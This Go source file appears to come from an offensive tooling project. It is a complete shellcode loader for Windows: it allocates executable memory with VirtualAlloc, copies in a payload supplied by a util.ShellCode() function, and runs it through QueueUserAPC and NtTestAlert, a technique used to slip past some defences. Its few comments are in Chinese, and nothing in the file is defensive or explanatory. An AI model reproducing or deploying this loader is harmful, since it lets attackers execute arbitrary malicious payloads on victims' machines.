package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
	MEM_RELEASE            = 0x8000
)

// 定义一个类型为syscall.NewCallback的函数，以便将其传递给QueueUserAPC
type myNtTestAlert func() uintptr

// 由于Golang中没有直接的方式去实现shellcode，下面的buf表示原始的shellcode字节数组。

func Run(op []byte) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")

	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	virtualFree := kernel32.MustFindProc("VirtualFree")
	getCurrentThread := kernel32.MustFindProc("GetCurrentThread")
	queueUserAPC := kernel32.MustFindProc("QueueUserAPC")

	ntTestAlert, _ := syscall.GetProcAddress(ntdll, "NtTestAlert")
	address, _, err := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	if address == 0 {
		fmt.Printf("VirtualAlloc failed with error: %v\n", err)
		return
	}
	defer virtualFree.Call(address, 0, MEM_RELEASE)

	for i := range op {
		*(*byte)(unsafe.Pointer(address + uintptr(i))) = op[i]
	}

	// 获取当前线程句柄
	apcRoutine, _, err := getCurrentThread.Call()
	if apcRoutine == 0 {
		fmt.Printf("Error: apcRoutine handler: %v\n", err)
		return
	}
	// 将shellAddress转换为syscall.NewCallback，以便将其传递给QueueUserAPC

	ret, _, err := queueUserAPC.Call(address, apcRoutine, 0)
	if ret == 0 {
		fmt.Printf("Error: queueUserAPC handler: %v\n", err)
		return
	}
	syscall.Syscall(uintptr(ntTestAlert), 0, 0, 0, 0)
}

func main() {
	Run(util.ShellCode())
}
